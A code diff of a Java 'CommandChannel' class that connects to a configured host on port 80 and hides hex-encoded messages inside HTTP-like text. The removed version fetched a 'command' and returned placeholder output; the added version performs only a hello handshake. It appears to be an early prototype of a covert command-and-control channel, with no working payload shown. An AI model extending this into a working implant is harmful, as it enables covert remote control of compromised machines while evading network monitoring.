@@ -1,13 +1,17 @@
 package networking;
 
+
+import java.awt.SecondaryLoop;
 import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.net.SocketAddress;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.stream.Collectors;
 
 public class CommandChannel implements Runnable{
 	String ip;
@@ -22,62 +26,92 @@ public class CommandChannel implements Runnable{
 	}
 	@Override
 	public void run() {
-		while(true) {
 			try {
-				Socket s=new Socket(ip,80);
-				out = new PrintWriter(s.getOutputStream(), true);
-		        in = new BufferedReader(new InputStreamReader(s.getInputStream()));
-		        out.print(new String(httpPrefix)+"524459"+new String(httpPostfixFinal));
-		        out.flush();
-		        char[] buffer = new char[552];
-		        String command = "";
-		        while(buffer[547]!='1'){
-		        	in.read(buffer);
-		        	command+=decodeResponse(new String(buffer));
-		        }
-		        
-		        System.out.println(command);
-		        
-		        String response = "command output goes here";
-		        
-		        ArrayList<String> responsePackets = encodeResponse(response);
-		        
-		        for(String responseData : responsePackets){
-		        	out.print(responseData);
-		        	out.flush();
-		        }
-		        s.close();
+				while(true){
+					System.out.println("[-] Exchange Begins");
+					Socket s=new Socket(ip,80);
+					String serverHello = readAll(s); //Server Hello
+					String decoded = decodeResponse(serverHello);
+					System.out.println(decoded);
+					System.out.println("[-] Server Hello Recieved");
+					sendAll(s, "Client Is Ready!");
+					System.out.println("[-] Client Hello Sent");
+					Thread.sleep(1000);
+					break;
+				}
 			} catch (IOException e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
+			} catch (InterruptedException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
 			}
-			
+	}
+	private void sendAll(Socket s, String clientHello) throws IOException {
+		ArrayList<String> allPacks = this.encodeResponse(clientHello);
+		for(String pack : allPacks){
+			s.getOutputStream().write(pack.getBytes());
+			s.getOutputStream().flush();
 		}
 		
 	}
-	private String decodeResponse(String buffer) {
-		String encData = buffer.substring(httpPrefix.length, httpPrefix.length+6);
-		String byte1 = encData.substring(0,2);
-		String byte2 = encData.substring(2,4);
-		String byte3 = encData.substring(4);
+	@SuppressWarnings("unused")
+	private String readAll(Socket socket) throws IOException {
+		int c;
+	    String raw = "";
+	    do {
+	        c = socket.getInputStream().read();
+	        raw+=(char)c;
+	    } while(socket.getInputStream().available()>0);
+	    return raw;
+	}
+	private String decodeResponse(String rawResponse) {
+		List<String> totalInput = NetUtil.getParts(rawResponse, httpPrefix.length+httpPostfix.length+6);
 		String output = "";
-		output+=(char)Integer.parseInt(byte1,16);
-		output+=(char)Integer.parseInt(byte2,16);
-		output+=(char)Integer.parseInt(byte3,16);
+		for(String packet : totalInput){
+			String encData = packet.substring(packet.indexOf("text=\"#")+"text=\"#".length(), packet.indexOf("text=\"#")+6+"text=\"#".length());
+			System.out.println("[D]	Encoded Data:"+encData);
+			String byte1 = encData.substring(0,2);
+			String byte2 = encData.substring(2,4);
+			String byte3 = encData.substring(4);
+			output+=(char)Integer.parseInt(byte1,16);
+			output+=(char)Integer.parseInt(byte2,16);
+			output+=(char)Integer.parseInt(byte3,16);
+		}
+		
 		return output;
 	}
+		
 	private ArrayList<String> encodeResponse(String message){
 		ArrayList<String> temp = new ArrayList<String>();
 		List<String> inputChunks = NetUtil.getParts(message, 3);
 		for(int i = 0; i < inputChunks.size()-1; i++){
 			String byte1 = Integer.toHexString(inputChunks.get(i).charAt(0));
+			while(byte1.length()!=2){
+				byte1='0'+byte1;
+			}
 			String byte2 = Integer.toHexString(inputChunks.get(i).charAt(1));
+			while(byte2.length()!=2){
+				byte2='0'+byte2;
+			}
 			String byte3 = Integer.toHexString(inputChunks.get(i).charAt(2));
+			while(byte3.length()!=2){
+				byte3='0'+byte3;
+			}
 			temp.add(new String(httpPrefix)+byte1+byte2+byte3+new String(httpPostfix));
 		}
 		String byte1 = Integer.toHexString(inputChunks.get(inputChunks.size()-1).charAt(0));
+		while(byte1.length()!=2){
+			byte1='0'+byte1;
+		}
 		String byte2 = Integer.toHexString(inputChunks.get(inputChunks.size()-1).charAt(1));
+		while(byte2.length()!=2){
+			byte2='0'+byte2;
+		}
 		String byte3 = Integer.toHexString(inputChunks.get(inputChunks.size()-1).charAt(2));
+		while(byte3.length()!=2){
+			byte3='0'+byte3;
+		}
 		temp.add(new String(httpPrefix)+byte1+byte2+byte3+new String(httpPostfixFinal));
 		return temp;
 	}
